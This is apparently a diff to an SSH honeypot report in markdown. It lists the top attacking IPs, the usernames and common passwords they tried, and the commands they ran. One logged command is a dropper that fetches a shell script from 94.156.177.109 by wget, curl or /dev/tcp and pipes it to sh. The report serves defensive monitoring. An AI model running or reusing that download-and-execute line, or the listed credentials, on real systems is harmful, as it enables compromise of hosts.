@@ -13,52 +13,55 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 39.108.222.216 | 10769 |
-| 47.237.83.51 | 9051 |
-| 47.99.37.116 | 5065 |
-| 39.100.33.130 | 4595 |
-| 47.83.27.44 | 4565 |
-| 8.218.245.172 | 4331 |
-| 47.238.224.55 | 4215 |
-| 47.92.39.5 | 2547 |
-| 109.123.254.15 | 1225 |
-| 47.96.126.90 | 851 |
+| 47.90.216.171 | 4781 |
+| 47.109.157.6 | 4769 |
+| 139.129.13.203 | 4742 |
+| 47.237.2.192 | 4714 |
+| 47.97.60.163 | 4655 |
+| 47.76.135.189 | 4248 |
+| 139.196.79.175 | 2109 |
+| 8.135.77.231 | 421 |
+| 47.109.53.53 | 172 |
+| 39.109.126.174 | 160 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 1441 |
-| test | 586 |
-| developer | 513 |
-| server | 511 |
-| odoo | 510 |
-| test2 | 509 |
-| amx | 508 |
-| user3 | 505 |
-| Manager | 503 |
-| banking | 503 |
+| root | 1152 |
+| admin | 188 |
+| ubuntu | 138 |
+| test | 130 |
+| user | 117 |
+| postgres | 74 |
+| deploy | 72 |
+| steam | 70 |
+| dev | 68 |
+| debian | 61 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 101 |
-| 111111 | 42 |
-| password | 36 |
-| P@ssw0rd | 33 |
-| 1234 | 29 |
-| test | 28 |
-| 1234567890 | 28 |
-| 321 | 27 |
-| 123 | 27 |
-| admin123 | 26 |
+| 123456 | 40 |
+| password | 26 |
+| 1234 | 22 |
+| P@ssw0rd | 18 |
+| 123 | 18 |
+| Aa123456 | 17 |
+| 12345678 | 16 |
+| Admin@123 | 14 |
+| test | 13 |
+| 456123 | 13 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 182.92.184.12 | uname -s -m |
-| 120.27.120.108 | uname -s -m |
-| 1.92.158.201 | uname -s -m |
-| 120.26.104.57 | uname -s -m |
+| 120.27.238.214 | uname -s -m |
+| 120.27.140.190 | uname -s -m |
+| 47.251.29.45 | uname -s -m |
+| 120.26.84.54 | uname -s -m |
+| 47.251.100.22 | uname -s -m |
+| 39.109.126.174 | uname -s -m |
+| 87.120.113.231 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
